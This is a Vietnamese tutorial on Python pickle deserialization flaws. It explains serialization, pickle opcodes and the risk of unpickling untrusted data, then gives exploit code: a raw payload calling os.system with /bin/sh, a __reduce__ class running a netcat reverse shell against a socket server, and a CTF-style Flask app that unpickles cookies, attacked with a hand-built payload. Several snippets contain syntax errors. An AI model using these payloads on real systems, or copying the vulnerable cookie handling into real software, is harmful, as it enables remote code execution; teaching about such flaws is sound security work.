# Deserialization trong python

![](https://codefather.tech/wp-content/uploads/2021/05/python-pickle-840x480.png?ezimgfmt=rs:364x208/rscb7/ng:webp/ngcb7)

## 1. Lỗ hổng Deserialization trong python

Python cũng cung cấp các object serialization như Java và nó có nhiều modules.

bao gồm `Pickle`, `marshal`, `shelve`, `yaml` và `json`là  khuyến khích modules khi thực hiện serialize và deserialize.


Ta có thể quan sát sự khác biệt giữa Java và Python trong quá trình deserialize, Python không phụ thuộc vào dòng mã để tạo tải trọng cho nó một cách đơn giản.


Deserializing tất cả các lớp hành vi này có thể dẫn đến RCE Serialization có thể là được tìm thấy trong các `parameters` hoặc `cookie`.


Đầu tiên, ta sẽ khám phá Pickle có tính chất gì trong Python.

## 2. Serialization sử dụng trong `pickle` Python

Pickle được sử dụng để serializing và de-serializing object trong python, còn được gọi là sắp xếp hoặc làm phẳng. 

Serialization đề cập đến quá trình chuyển đổi một object trong bộ nhớ thành một luồng byte có thể được lưu trữ trên memory hoặc được gửi qua network.

Sau đó, luồng ký tự này sau đó có thể được truy xuất và deserialize trở lại object Python. 

Đầu tiên là chuyển đổi một đối tượng từ một biểu diễn (dữ liệu trong Bộ nhớ RAM) sang một biểu diễn khác (văn bản trên đĩa), trong khi thứ hai là quá trình mã hóa dữ liệu với ít bit hơn, để tiết kiệm memory.

## 3. Tại sao lại cần `pickle`?

`Pickle` rất hữu dụng cho các ứng dụng cần mức độ ổn định cho dữ liệu.

Trạng thái dữ liệu của chương trình có thể được lưu vào memory, để có thể tiếp tục làm việc với nó sau này.

Nó cũng có thể được sử dụng để gửi dữ liệu qua giao thức TCP hoặc Socket truyền object python trong cơ sở dữ liệu.

`Pickle` rất hữu ích khi đang làm việc với thuật toán học máy, nơi ta có thể lưu chúng để đưa ra các dự đoán mới sau này mà không cần phải viết lại mọi thứ hoặc train lại model.

## 4. Khi nào không nên sử dụng `pickle`

Nếu muốn sử dụng data trên các ngôn ngữ lập trình khác nhau thì `pickle` không phải là một sự lựa chọn. 

Giao thức của nó dành riêng cho Python, do đó, khả năng tương thích giữa các ngôn ngữ khác không được đảm bảo. 

Điều tương tự cũng xảy ra đối với các phiên bản Python khác nhau. 

Bỏ chọn một file được chọn trong một phiên bản Python khác có thể không phải lúc nào cũng hoạt động bình thường, vì vậy phải đảm bảo rằng ta đang sử dụng cùng một phiên bản và thực hiện cập nhật nếu cần. 

Ta cũng nên cố gắng không bỏ chọn dữ liệu từ một nguồn không đáng tin cậy. Mã độc hại bên trong tệp có thể được thực thi khi giải nén.

Module `pickle` thực hiện một thuật toán cơ bản nhưng mạnh mẽ cho serialize và deserialize cấu trúc object python.

Dữ liệu không đáng tin cậy được deserialze và có thể gây ảnh hưởng đến ứng dụng.

`Pickle` có các chức năng để serialization và deserialization:

* `dump`: Write serialized object để mở file.

* `load`: Chuyển đổi bytes stream thành object.

* `dumps`: Trả về serialized object dưới dạng chuỗi.

* `loads`: Trả về deserialization dưới dạng chuỗi.

Ví dụ: 

```python
import pickle

def serialze(obj):
    with open(r'file.txt', 'wb') as file:
      pickle.dump(obj, file)

def deserialze():
    with open(r'file.txt', 'rb') as file:
      print(pickle.load(file))

x = [i for i in range(5)]

serialze(x)

deserialze()
```

Đầu tiên ta sẽ tạo 2 hàm đầu tiên là `serialze()` để ghi object vào file.

Thứ hai là `deserialze()` để chuyển đổi bytes trong tệp tới object và trả về chúng. nó là một cái list nằm trong khoảng từ 0...4.

![](https://i.imgur.com/0guY8gj.png)

Hướng dẫn `Pickle`

* `C`: Đọc đến dòng mới dưới dạng tên module, tiếp theo đọc dòng mới như object hệ thống.

* `(`: Chèn object đánh dấu vào stack và ghép nối với `t` để tạo ra tuple.

* `t`: Pop các đối tượng ra khỏi ngăn xếp cho đến khi tạo được 1 tuple chức các object xuất hiện ngoại trừ `()` theo thứ tự.

* `S`: ĐỌc chuỗi sau trong dấu ngoặc kép hoặc đẩy nó vào stack 

* `R`: Đẩy kết quả vào ngăn xếp.

* `.`: Kết thúc `pickle`.


```
cos
system
(S'/bin/sh'
tR.
```

## 5. Khai thác RCE từ `Pickle`

Phần này ta sẽ sử dụng pickle trong thực tế để giao tiếp với máy chủ chấp nhận object được serialized qua kết nối socket.

```python
#!/usr/bin/python

import os, pickle, socket

def server(so):
    data = so.recv(1024)
    obj = pickle.loads(data)
    c.send('Object try again')

socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

while True:
    c, a = socket.accept()
    if os.fork() == 0:
        c.send('accept connect)
        server(c)
        exit()
```

Ta có thể tìm thấy các đối tượng dược serialize trong web của python được sử dụng cookies và nhiều nơi bị tấn công khác.

Sau khi xác định được lỗ hổng, tiếp theo ta cần RCE.

```python
import pickle, socket, os

class pwn(obj):
    def __reduce__(self):
        c = 'nc 127.0.0.1 4443 -e /bin/bash'
        return (os.system, (c,))

pwn = pickle.dumps(pwn())
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(('127.0.0.1'), 4444)
print(soc.recv(1024))
soc.send(pwn)
print(soc.recv(1024))
```

Khi một object được tạo ra để được serialize trong trường hợp này nó là một lớp pwn.

Ta khám phá ra các điểm quan trọng để khai thác `pickle` liên quan đế lỗ hổng `__reduce__` ta xác định payload để reverse shell bằng cách sử dùng `netcat` sau đó nó phải được trả về string hoặc tuple.

## 6. Thực hành

Deserialization trong cookie:

Code:

```python
from flask import Flask
app = Flask(__name__)

@app.route('/')
def jar():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	return '<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">' + \
		''.join(f'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>' for item in items)

@app.route('/add', methods=['POST'])
def add():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	items.append(request.form['item'])
	response = make_response(redirect('/'))
	response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
	return response
```

Payload:

```python
#!/usr/bin/python3
import codecs
import base64
import pickletools

p  = b'('               # create mark
p += b'c'               # push self.find_class(modname, name); 2 string args
p += b'os\n'            # arg1
p += b'getenv\n'        # arg2
p += b'('               # create mark
p += b'S"FLAG"\n' # push string
p += b't'               # build tuple
p += b'R'               # apply callable to argtuple, both on stack
p += b'l'
p += b'.'               # stop

pickle_encoded = codecs.encode(p, 'base64').replace(b'\n', b'')

pickletools.dis(base64.b64decode(pickle_encoded), annotate=1)
print("Payload: " + bytes.decode(pickle_encoded))
```